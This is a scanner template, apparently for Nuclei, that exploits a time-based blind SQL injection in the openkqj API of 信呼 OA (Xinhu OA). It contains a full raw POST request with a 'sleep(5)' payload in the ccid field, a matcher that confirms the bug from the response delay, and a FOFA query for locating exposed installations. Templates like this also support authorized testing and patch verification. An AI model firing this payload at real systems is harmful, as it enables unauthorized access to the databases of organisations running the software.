id: poc-gshcple6s68rcde2
info:
  name: 信呼OA openkqjAction 存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gshcple6s68rcde2

    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: gshcple6s68rcde2
    fofa: app="信呼-OA系统"
http:
- raw:
  - 'POST /index.php?a=api&m=openkqj|openapi&d=task&sn=1&/post HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/javascript, */*; q=0.01

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36

    X-Requested-With: XMLHttpRequest

    Accept-Encoding: gzip, deflate, br

    Accept-Language: zh-CN,zh;q=0.9

    Connection: close

    Content-Type: application/x-www-form-urlencoded


    {"a":{"data":"fingerprint","ccid":"1'' or sleep(5)#''","fingerprint":"3"}}'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
